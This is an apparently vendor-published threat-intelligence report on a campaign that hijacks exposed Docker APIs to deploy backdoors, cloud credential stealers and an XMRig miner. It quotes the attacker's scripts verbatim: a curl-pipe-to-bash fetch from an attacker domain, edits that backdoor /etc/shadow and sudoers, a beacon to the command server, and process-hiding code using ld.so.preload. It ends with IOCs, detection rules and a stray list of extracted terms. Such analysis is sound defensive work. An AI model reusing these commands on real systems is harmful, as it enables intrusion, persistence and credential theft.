@@ -1,0 +1,291 @@
+
+Key points and observations
+
+We have identified a unique campaign scanning the internet for exposed Docker API endpoints. The campaign does not target a specific organization—rather, it focuses on attacks of opportunity against misconfigured Docker API endpoints.
+Once the scanners identify vulnerable or misconfigured Docker API endpoints, the threat actor deploys several backdoors, as well as cloud credential stealers on compromised machines.
+We have observed this actor attempting to use compromised cloud credentials to establish persistence by creating new IAM users
+The campaign attempts to hide long-lasting activity using several Linux-based userland anti-forensics techniques.
+The threat actor's inadvertent exposure of a list of compromised machines and associated credentials has allowed us to assess the extent of the campaign. We promptly reported the compromised credentials and hosts to cloud providers to facilitate targeted mitigation efforts.
+The campaign is still active as of January 30, 2024.
+This campaign exhibits characteristics similar to one reported by Permiso, SentinelOne, and Aqua Security a few months ago.
+Analysis of the attack
+During our research, we observed the threat actor scanning internet-facing IP ranges for Docker API endpoints on ports 2375-2377 and alternative ports 4343-4244, using a combination of masscan and zgrab.
+Enumeration
+When encountering an unprotected Docker API without authentication, the threat actor initiates reconnaissance by gathering installation details.
+GET /v1.24/info
+
+Host: <victim>:2375
+User-Agent: Go-http-client/1.1
+GET /v1.24/images/json
+
+Host: <victim>:2375
+User-Agent: Go-http-client/1.1
+They then run a container to identify if they have already compromised the target, by checking for the presence of a malicious systemd service:
+POST /v1.24/containers/create
+
+Host: <victim>:2375
+User-Agent: Go-http-client/1.1
+Content-Type: application/json
+
+{
+  "Image": "alpine",
+  "HostConfig": {
+    "Binds": ["/:/host"],
+    "PidMode": "host",
+    "Privileged": true,
+  },
+  "Cmd": [
+    "chroot", "/host",
+    "sh", "-c", "systemctl is-active dockercache 2>/dev/null"
+  ]
+}
+We noticed the threat actor running this type of scan from multiple IP addresses starting on November 14, 2023.
+Malicious payload deployment
+Beginning January 14, 2024, the threat actor started to deploy malicious payloads by creating a container image based on cmd.cat/chattr and running the following command:
+curl -sLk http://leetdbs.anondns.net/cmd/1.sh | bash 2>/dev/null
+This malicious bash script downloads and executes several other malicious scripts, which are covered in the next sections.
+Container images hosted on the cmd.cat registry are not necessarily malicious—but they are often used by attackers because they provide an easy way to run common system utilities that may not necessarily be installed on the system.
+Persistence: Backdooring SSH configuration all the way down
+This first script, retrieved from http://45.9.148[.]193/cmd/sh.php?sh=user establishes persistence on compromised machines in multiple ways, making it more challenging to get rid of the malicious code once discovered.
+First, the script adds two SSH public keys to the authorized_keys file of the current user and of the root user. Then, it modifies the system-wide SSH configuration with the following settings:
+PermitRootLogin yes
+PermitTunnel yes
+PasswordAuthentication yes
+It also disables SSH logging by setting LogLevel to QUIET.
+After tampering with the SSH configuration, the script backdoors the default games user account and ensures the attacker can leverage it, by:
+
+Assigning the account a hardcoded password, dog
+Adding it to the sudoers file
+Overwriting /usr/bin/nologin with /bin/bash
+if ! [ -f "/bin/bash" ]; then 
+    cp /bin/sh /usr/bin/nologin 2>/dev/null
+else
+    cp /bin/bash /usr/bin/nologin 2>/dev/null
+fi
+
+sed -i '/games:/c\games:$6$wj0O7rk1$l/WNmXvf7nmmz8eATb3.7CiMKziKqARYVI0vnZIxeHu2mdxhfwdI3SNSlc5f2KeKDTG1RX.qPNPCV.mUJJNwP0:19556:0:99999:7:::' /etc/shadow
+
+echo "games    ALL=(ALL:ALL) ALL" >> /etc/sudoers
+After having backdoored the system, the malicious script calls http://45.9.148.193/insert/in.ssh.php to report to the command-and-control (C2) server that it has been infected.
+SRCURL="http://45.9.148.193"
+
+SSHOLIP=$(curl -sLk ipv4.icanhazip.com) ; fi
+SSHPORT=$(cat /etc/ssh/sshd_config 2>/dev/null | grep 'Port' | grep -v 'GatewayPorts\|#Port' | awk '{print $2}')
+
+curl -v -Lk "$SRCURL/insert/in.ssh.php?port=$SSHPORT&remoip=$SSHOLIP"
+Persistence: gsocket
+The next script, downloaded from http://leetdbs.anondns[.]net/cmd/sh.php?sh=gsc, installs gsocket, a network utility that can be used as a remote access tool. Attackers have increasingly been using legitimate secure remote access tools such as ngrok or cloudflared to bypass firewalls and access a system after an initial compromise.
+The installation process exhibits several characteristics that clearly attempt to hide under the radar. First, the gsocket binary is downloaded to the memory-mapped /dev/shm file system. This means that analyzing an image of persistent storage—as is often done during incident response—would not reveal any sign of the installation.
+curl -fksSL $GSCBINURL -o /dev/shm/.nc.tar.gz
+
+if ! tar -xzf/dev/shm/.nc.tar.gz -C /bin gs-netcat; then
+  docker run -t -v /:/host --privileged cmd.cat/tar tar xzf /host/dev/shm/.nc.tar.gz -C /host/bin gs-netcat
+fi
+After creating a systemd service to run gsocket, the malicious script then actively hides the running process by creating a bind mount of an empty directory on /proc/[pid]. This is a simple but relatively uncommon trick that effectively hides the running process from system utilities such as ps or top.
+declare dir=/usr/foo
+mkdir -p $dir
+mount --bind /usr/foo /proc/$1
+Cloud-native credential stealer
+The next script, http://leetdbs.anondns[.]net/cmd/sh.php?sh=aws, is a credential stealer that targets various types of credentials, including:
+
+AWS credentials from the instance metadata service (IMDS)
+AWS credentials from various hardcoded locations, such as .s3cfg
+Google Cloud credentials from the environment (e.g., $GOOGLE_DEFAULT_CLIENT_SECRET) and access token files such as access_tokens.db
+Azure credentials from the environment (e.g., $AZURE_CLIENT_SECRET)
+Environment variables of all running processes, through /proc/*/env
+Configuration of running containers, through docker inspect.
+We observed this actor pivoting into victim environments when they compromise AWS credentials. To achieve this, they attempt to create an IAM user named aws_support, assign it a console profile and administrator permissions, and finally create an access key for it.
+Crypto mining: XMRig
+The final script, http://leetdbs.anondns[.]net/cmd/sh.php?sh=xcc, installs the XMrig crypto miner. While this is a common final payload for cloud-focused threat groups, a few things make the script particularly unique.
+After installing XMRig and setting up a systemd service to run it, the script attempts to hide the crypto miner:
+function initmain(){
+  xmr_setup
+  xmr_hide
+  secure
+  cleanup
+}
+The xhr_hide function works by writing the contents of libprocesshider.c (embedded in the bash script) to disk and compiling it on the fly to generate several shared object (.so files), each hiding one specific process:
+mkdir /.../
+cd /.../ 
+echo "I2R[...]Rpcik7Cg==" | base64 -d > /.../p.c
+
+sed -i 's#evil_script.py#docker-proxy#g' p.c
+gcc -Wall -fPIC -shared -o docker-proxy.so p.c -ldl
+mv docker-proxy.so /usr/local/lib/docker-proxy.so
+
+# Repeated for 'docker-cache', 'gs-netcat' and 'sh'
+The script then adds these files to the list of shared objects to pre-load, by writing to /etc/ld.so.preload:
+echo "L3Vzci9sb2NhbC9saWIvZG9ja2VyLXByb3h5LnNvCi91c3IvbG9jY
+WwvbGliL2RvY2tlci1jYWNoZS5zbwovdXNyL2xvY2FsL2xpYi9ncy1uZXRj
+YXQuc28KL3Vzci9sb2NhbC9saWIvc2guc28K" | base64 -d > /etc/ld.so.preload
+Note that this Base64-encoded payload decodes to the paths of the .so files:
+/usr/local/lib/docker-proxy.so
+/usr/local/lib/docker-cache.so
+/usr/local/lib/gs-netcat.so
+/usr/local/lib/sh.so
+Any time a new process is created, the code of these shared objects is executed automatically and hides the malicious processes using libprocesshider, which works by hooking the intercepting calls to readdir() before it reaches libc.
+static struct dirent * ( * original_ # #readdir)(DIR * ) = NULL;
+
+struct dirent * readdir(DIR * dirp) {
+  // ... 
+
+  struct dirent * dir;
+
+  while (1) {
+    dir = original_readdir(dirp);
+    if (dir) {
+      char dir_name[256];
+      char process_name[256];
+
+      // Editor's note
+      // If the readdir() call is on /proc and targets the process to hide, don't return it
+      if (get_dir_name(dirp, dir_name, sizeof(dir_name)) &&
+        strcmp(dir_name, "/proc") == 0 &&
+        get_process_name(dir -> d_name, process_name) &&
+        strcmp(process_name, process_to_filter) == 0) {
+        continue;
+      }
+    }
+    break;
+  }
+  return dir;
+}
+Backdooring outgoing SSH sessions: SSH-IT
+As a final step, the script installs ssh-it, a utility that intercepts outgoing SSH connections to steal passwords, commands typed, and the output of those commands.
+Analysis of the campaign's impact and infrastructure
+In this section, we analyze the broader campaign's impact, infrastructure, and potential links to other threat actors.
+Impact
+As we've seen in previous sections, this campaign leverages several scripts to establish persistence, backdoor the system, and steal cloud credentials.
+Along the way, the scripts "phone home" to several locations, in order to report that they have successfully infected a system:
+http://45.9.148[.]193/insert/in.ssh.php
+http://45.9.148[.]193/insert/keys.php
+As it turns out, these servers have exposed their lists of compromised machines and identities and left them available for anyone to see. Based on these lists, we were able to assess the breadth of the campaign. As of early February 2024, this campaign had:
+
+More than 560 compromised machines that were actively mining crypto currency
+More than 400 compromised machines that had been backdoored
+Roughly 30 compromised cloud access keys belonging to 16 unique accounts, including 19 long-lived access keys that were likely to still be valid
+Several credentials for Docker registries and internet-facing cloud-hosted databases
+We reported the leaked access keys and compromised VM instances to the respective cloud providers, so they could take appropriate action.
+As of late January 2024, the threat actor had mined 4.3 monero, corresponding to around $700 USD. Most of the active miners are located in China (75 percent), followed by the US (15 percent) and Vietnam (1.8 percent).
+Infrastructure
+We have observed the threat actor leveraging several compromised hosts to perform scanning activities and spread the reach of their campaign further. Specifically, we searched our honeypots for scanning or exploitation activity that resembled the patterns we had already observed and found a number of IPs that had been performing similar activities.
+Relationship to existing campaigns
+Other researchers (Permiso and Aqua Security) have observed attacker tooling and infrastructure that is similar to that of the campaign we analyzed, especially the credential stealer. The campaign we report on here appears to have a larger scale than those previously observed and exhibits unique, new anti-forensics behavior.
+Although different, the tooling used by the campaign exhibits shared characteristics with TeamTNT, such as:
+
+The use of anondns[.]net domains
+Exact matches in some pieces of the malicious code—for instance, the process to backdoor a system by hijacking the default games user
+Similarities in the URL paths where malicious scripts are hosted, such as /cmd/aws.sh
+Exact matches of a number of function names, such as make_ssh_backdoor and make_hiden_door (including the typo)
+The use of masscan, zgrab, libprocesshider, and XMRig
+The presence of numerous strings in German
+We consequently assess that some of the tooling in this campaign directly comes from TeamTNT.
+Note: Cado Security published their analysis of the same campaign the same day as this publication, although with a different set of indicators of compromise. In their analysis, the campaign is nicknamed "Commando Cat."
+Attribution
+As mentioned in the previous analysis of this campaign's cloud-native credential stealer, we found evidence that once the threat actor compromises AWS credentials, they create an IAM user with a console password. It turns out that the password used is very unique. By analyzing previous, publicly available password data breaches, we were able to identify an individual linked to this password, including their full name, residential IP address, and Facebook profile.
+A note about attribution: Without legal methodologies mostly used by law enforcement agencies and governments, it’s rare in cyber threat intelligence to attribute a persona or campaign to a specific individual. We have confidence that this is most likely the operator since a) it was through hands-on-keyboard activity that they leaked a unique password and b) humans tend to be creatures of habit and reuse passwords.
+Another campaign leveraging the same infrastructure
+We have observed another campaign leveraging the same infrastructure, that compromises servers with open Docker API endpoints by delivering an UPX-packed version of an IRC backdoor, "ziggystartux," which is available on GitHub. The address of the C2 server is embedded in the binary and is open on the internet for anyone to join. This allowed us to retrieve the list of compromised machines:
+From this IRC channel, the attacker can send a number of commands to their "bots":
+Conclusion
+Cloud-based cybercrime campaigns like the one we have detailed here focus on attacks of opportunity and typically target low-hanging fruit—i.e., vulnerable infrastructure. In this case, a misconfigured Docker endpoint can lead to a compromise of your host or containers Many of the compromised containers and hosts had cloud access keys and secrets on their filesystem, making it easy for the actors to find and exfiltrate them. We confirmed that the actor not only stole the keys, but pivoted into the cloud environments of at least 1 victim and attempted to backdoor the account with an Administrator user.
+Attribution matters, but to what extent? The tool reuse we observed with this campaign shows that many of these actors rely on copying other malicious tool sets in order to accelerate operations, which can muddy the waters when answering the question, “Who did this?” We recommend that cloud-based defenders should spend most of their energy on raising the barrier to entry for opportunistic criminals like the one in this post.
+How Datadog can help
+Datadog Cloud Security Management (CSM) comes with the following out-of-the-box runtime security rules, which enable you to detect the types of attacker activity discussed in this post:
+
+Docker daemon publicly accessible
+Egress over IRC port
+Compiler executed in container
+DNS lookup for cryptocurrency mining pool
+DNS lookup for IP lookup service
+Network utility executed
+Executable bit added to newly created file
+Credentials file modified
+Systemd service modified
+Sudoers policy file modified
+SSH authorized keys modified
+Suspected dynamic linker hijacking attempt
+Indicators of compromise
+Public SSH key fingerprints used to backdoored compromised machines
+45W1sT0sjgrR77y4bXL4bWy5w3SYzHdZE1gA37VJnrg
+8TqQhiJRBW+pTRMtagynYZRW+H2FM8EBJHaeK7Mhx3k
+IP addresses
+
+IP address	Last scanning activity observed
+129.213.126.209	2023-11-14
+185.156.174.178	2024-01-28
+80.239.140.66	2023-12-07
+80.239.140.67	2024-01-29
+91.240.65.5	2023-12-27
+45.9.148.193	2024-01-30
+68.183.76.115	2023-12-26
+92.223.88.171	2023-12-31
+45.9.148.202	2024-01-24
+91.240.65.2	2024-01-03
+46.114.226.145	2024-01-03
+45.130.85.2	2024-01-11
+91.236.55.133	2024-01-12
+91.236.55.152	2024-01-14
+80.248.243.202	2024-01-18
+185.9.19.90	2024-01-30
+Scripts
+
+Name	SHA256
+1.sh	decf24972ad4319175623b920de0b3fc9935f8b02c5c848d10748fcf816f76cd
+sh.php?sh=aws	fe2970514ec28260865392bbd46b36a5cf6e430ef307e65229fd0915d1f6647c
+sh.php?sh=gsc	69b60d56add2a2d8f6b8d68a86a03e81ec3fe0b80b134ba0b3b068b085fb804a
+sh.php?sh=user	f445537b31a7b575e5f0937fe350564890ec6250ecd07d5099626e59808bb5c0
+sh.php?sh=xcc	e6b50cef5a9085167fa2c1880a13f3475be9ede75724d74247591b6ef8c1b995
+Systemd service names
+gsc.service
+dockercache.service
+Hostnames
+ap-northeast-1.compute.internal[.]anondns.net
+leetdbs.anondns[.]net
+myproxy.anondns[.]net
+panel001.anondns[.]net
+registerit.anondns[.]net
+silentbob.anondns[.]net
+stargate.anondns[.]net
+cmd.cat/chattr
+http://45.9.148[.]193/cmd/sh.php?sh=user
+authorized_keys
+root
+LogLevel
+QUIET
+games
+dog
+sudoers
+/usr/bin/nologin
+/bin/bash
+http://45.9.148.193/insert/in.ssh.php
+http://leetdbs.anondns[.]net/cmd/sh.php?sh=gsc
+/dev/shm
+/proc/[pid]
+ps
+top
+http://leetdbs.anondns[.]net/cmd/sh.php?sh=aws
+.s3cfg
+$GOOGLE_DEFAULT_CLIENT_SECRET
+access_tokens.db
+$AZURE_CLIENT_SECRET
+/proc/*/env
+docker inspect
+aws_support
+http://leetdbs.anondns[.]net/cmd/sh.php?sh=xcc
+xhr_hide
+libprocesshider.c
+.so
+/etc/ld.so.preload
+.so
+readdir()
+libc
+games
+/cmd/aws.sh
+make_ssh_backdoor
+make_hiden_door
+1.sh
+sh.php?sh=aws
+sh.php?sh=gsc
+sh.php?sh=user
+sh.php?sh=xcc
